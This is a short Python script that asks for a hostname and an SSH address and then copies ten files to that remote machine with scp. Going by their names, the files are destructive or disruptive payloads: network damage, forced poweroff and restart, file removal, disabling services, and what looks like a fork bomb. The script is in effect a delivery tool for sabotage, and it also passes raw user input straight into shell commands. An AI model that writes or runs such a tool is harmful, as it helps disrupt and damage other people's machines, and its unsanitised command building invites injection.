import os 
import time as t 

A = str(input(" Hostname EX |pi| ==> "))
print(" --------------------------- ")
B = str(input(" IPA of ssh ==> "))
os.system(f' gnome-terminal -- scp damage-net.sh {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp poweroff.sh {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp restart.sh {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp fucked.py {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp remove.sh {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp annoyed.py {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp win-1.bat {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp disable.sh {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp win-2.bat {A}@{B}:~ ')
os.system(f' gnome-terminal -- scp fork.bat {A}@{B}:~ ')

